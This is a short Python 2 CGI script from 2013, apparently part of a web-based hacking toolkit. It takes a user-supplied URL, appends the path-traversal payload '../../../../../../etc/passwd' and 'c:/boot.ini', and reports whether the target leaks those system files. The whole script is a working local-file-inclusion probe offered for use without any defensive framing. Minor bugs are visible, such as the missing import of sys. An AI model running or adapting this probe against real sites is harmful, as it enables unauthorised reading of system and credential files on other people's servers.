#!/usr/bin/python 

#Tumi (c) 2013 at_lfi.py
 
import httplib2 
import urllib2 
import re 
import cgi
import cgitb
cgitb.enable()

# GET
form   = cgi.FieldStorage()
url = form.getvalue("url")

# HTML HEADERS
print "Content-Type: text/html; charset=UTF-8"	# Print headers
print ""

# HTML 

print '''
<html>
<body>
'''

if 'http://' not in url:  
    url = 'http://' + url 
lin = url+"../../../../../../etc/passwd" 
win = url+'''c:/boot.ini'''
http = httplib2.Http() 
req = urllib2.Request(url) 

try: 
	http.request(url) 
except IOError: 
	print "URL not found!" 
	sys.exit() 
else: 
    pass 


print "<textarea style=\"margin: 2px; height: 189px; width: 392px; color: white; background-color: transparent; \">"

response, content = http.request(lin) 

if response.status == 200: 
	if re.search("/root:/bin/bash",content): 
		
		print lin + "\nVulnerable Linux\n"
		 
	else: 
		print "Seems is not vulnerable Linux\n" 
	
elif response.status == 404: 
	print lin + " was not found!" 
else: 
	print response.status


response2, content2 = http.request(win)

if response2.status == 200:
	if re.search("boot loader",content2):
		print win + "\nWindows\n"
		   	
	else: 
		print "Seems is not vulnerable Windows\n" 

elif response2.status == 404: 
	print win +" was not found!" 
else: 
	print response2.status



print "</textarea>"

'''
</body>
</html>
'''
